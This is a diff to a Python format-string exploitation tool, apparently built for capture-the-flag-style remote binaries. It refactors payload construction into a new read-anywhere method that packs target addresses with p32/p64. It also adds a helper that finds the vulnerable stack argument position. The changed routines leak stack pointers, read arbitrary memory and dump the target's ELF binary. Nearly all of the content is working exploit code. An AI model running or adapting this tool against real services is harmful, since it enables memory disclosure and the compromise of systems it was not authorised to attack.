@@ -115,7 +115,7 @@ class ffstr():
 		if self.nb_request % 100 == 0:
 			self.yesno()
 			
-		# Too rapid connection also trigger manual request
+		# Too rapid connection trigger too a slow down
 		if self.last_request is None:
 			self.last_request = 0
 		_time = time()
@@ -253,6 +253,17 @@ class ffstr():
 				# Continue or not ?
 				if not self.yesno():
 					exit(1)
+	
+	def checkfstr(self,txt):
+		# use regex to find the payload		
+		fmts = re.findall(self.re_ArgPattern, txt)
+		if fmts:
+			self.stack_arg = None
+			for fmt in fmts:
+				beg = fmt.find(b"%")
+				end = fmt.find(b"$")
+				self.stack_arg = int(fmt[beg+1:end])
+				print("Stack Argument is in position "+str(self.stack_arg)+" ("+fmt.decode()+")")
 					
 	def stackAnalyze(self):
 		
@@ -278,17 +289,9 @@ class ffstr():
 		
 		# Checking flag
 		self.checkflag(txt)
-
-					
+	
 		# Regex generic stack payload
-		fmts = re.findall(self.re_ArgPattern, txt)
-		if fmts:
-			self.stack_arg = None
-			for fmt in fmts:
-				beg = fmt.find(b"%")
-				end = fmt.find(b"$")
-				self.stack_arg = int(fmt[beg+1:end])
-				print("Stack Argument is in position "+str(self.stack_arg)+" ("+fmt.decode()+")")
+		self.checkfstr(txt)
 
 	def unOffset(self,eip):
 		# support function find the offset from the binary starts \x7fELF...
@@ -360,7 +363,19 @@ class ffstr():
 		return data
 		
 		
-			
+	def readAnywhere(self,addr,minsize=8,leftpad="",rightpad=""):	
+		# Format String Read Anywhere payload
+		
+		# Calculte shifting of stack arg due to padding
+		L = len(leftpad+rightpad)+minsize
+				
+		if self.bits == 32:
+			pos_arg = self.stack_arg+ L // 4
+			pl = self.stackPayload(pos_arg,"s",size=L,left=leftpad,right=rightpad)+p32(addr)
+		else:
+			pos_arg = self.stack_arg+ L // 8
+			pl = self.stackPayload(pos_arg,"s",size=L,left=leftpad,right=rightpad)+p64(addr)
+		return pl	
 			
 	def locateBinary(self):
 		# Locate return_pointer, define offset and identify program header
@@ -390,15 +405,10 @@ class ffstr():
 					if regex:
 						leak = int(regex[0],16)
 				print("Leak "+hex(leak)+" ... Offset "+hex(guess),end="\r")
-					
-				# Set payload
-				if self.bits == 32:
-					pos_arg = self.stack_arg+2
-					pl = self.stackPayload(pos_arg ,"s",size=8)+p32(leak - guess)
-				else:
-					pos_arg = self.stack_arg+1
-					pl = self.stackPayload(pos_arg ,"s",size=8)+p64(leak - guess)
-					
+				
+				# Read anywhere format string
+				pl = self.readAnywhere(leak - guess,minsize=8,leftpad="",rightpad="")
+				
 				# Get Data
 				data = b""
 				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
@@ -407,7 +417,7 @@ class ffstr():
 				# ELF Header
 				if data.find(b"\x7fELF") > -1:
 					self.start = (i ,guess) 
-					print(hex(leak),i,data)
+					print(hex(leak),i,hex(guess),data)
 					self.close()
 					return
 
@@ -446,15 +456,10 @@ class ffstr():
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
 					leak = int(regex[0],16)
-					
-			# Set payload
-			if self.bits == 32:
-				pos_arg = self.stack_arg+2+2
-				pl = self.stackPayload(pos_arg,"s",size=8+4*2,left="d34d",right="b33f")+p32(leak - offset + n)
-			else:
-				pos_arg = self.stack_arg+1+2
-				pl = self.stackPayload(pos_arg,"s",size=8+8*2,left="    d34d",right="b33f    ")+p64(leak - offset + n)
-			
+						
+			# Read anywhere format string
+			pl = self.readAnywhere(leak - offset + n,minsize=8,leftpad="    d34d",rightpad="b33f    ")
+
 			# test is \n is present in generated payload
 			if pl.find(b"\n")>-1:
 				binary += b"\x00"
